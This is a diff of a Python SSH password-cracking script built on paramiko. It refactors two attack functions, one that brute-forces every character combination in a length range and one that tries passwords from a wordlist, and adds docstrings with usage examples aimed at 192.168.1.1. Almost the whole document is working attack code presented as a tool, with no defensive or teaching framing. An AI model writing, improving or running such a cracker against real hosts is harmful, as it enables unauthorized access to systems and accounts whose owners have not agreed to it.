@@ -1,20 +1,35 @@
 import argparse
-import paramiko
+from paramiko import SSHClient, AutoAddPolicy, AuthenticationException
 import itertools
 import string
 import time
-import signal
-import sys
 
-def signal_handler(sig, frame):
-    print('\n[!] Signal received. Exiting gracefully.')
-    sys.exit(0)
-
-signal.signal(signal.SIGINT, signal_handler)  # Handle Ctrl+C (SIGINT)
+client = SSHClient()
+client.set_missing_host_key_policy(AutoAddPolicy())
 
 def brute_force_ssh(username, server, charset, min_length, max_length):
-    client = paramiko.SSHClient()
-    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    """
+    Attempts to brute-force an SSH password by generating all possible
+    combinations of the given character set within a specified length range.
+
+    Args:
+        username (str): The username to authenticate.
+        server (str): The server address (hostname or IP) to connect to.
+        charset (str): A string representing the set of characters to use in generating passwords.
+        min_length (int): The minimum length of the passwords to try.
+        max_length (int): The maximum length of the passwords to try.
+
+    Returns:
+        str: The password if successfully found, or None if no password was found.
+    
+    Raises:
+        AuthenticationException: If authentication fails for the tried password.
+        Exception: If other connection errors occur.
+
+    Example:
+        >>> brute_force_ssh('admin', '192.168.1.1', 'abc123', 1, 4)
+        # This will attempt to connect using combinations of 'abc123' from length 1 to 4.
+    """
 
     for length in range(min_length, max_length + 1):
         for password in itertools.product(charset, repeat=length):
@@ -26,7 +41,7 @@ def brute_force_ssh(username, server, charset, min_length, max_length):
                 print(f"Password found: {password}")
                 client.close()
                 return password
-            except paramiko.AuthenticationException:
+            except AuthenticationException:
                 client.close()
                 continue
             except Exception as e:
@@ -37,8 +52,25 @@ def brute_force_ssh(username, server, charset, min_length, max_length):
     return None
 
 def dictionary_attack(username, server, wordlist):
-    client = paramiko.SSHClient()
-    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    """
+    Attempts to authenticate to an SSH server using passwords from a provided wordlist file.
+
+    Args:
+        username (str): The username to authenticate.
+        server (str): The server address (hostname or IP) to connect to.
+        wordlist (str): The path to a file containing a list of passwords to try, one per line.
+
+    Returns:
+        str: The password if successfully found, or None if no password was found.
+    
+    Raises:
+        AuthenticationException: If authentication fails for the tried password.
+        Exception: If other connection errors occur.
+
+    Example:
+        >>> dictionary_attack('admin', '192.168.1.1', 'passwords.txt')
+        # This will attempt to connect using passwords listed in 'passwords.txt'.
+    """
 
     with open(wordlist, 'r', encoding='utf-8', errors='ignore') as file:
         for line in file:
@@ -52,7 +84,7 @@ def dictionary_attack(username, server, wordlist):
                 print(f"Password found: {password}")
                 client.close()
                 return password
-            except paramiko.AuthenticationException:
+            except AuthenticationException:
                 client.close()
                 continue
             except Exception as e:
@@ -79,4 +111,7 @@ def main():
         brute_force_ssh(args.username, args.server, args.charset, args.min, args.max)
 
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        exit()
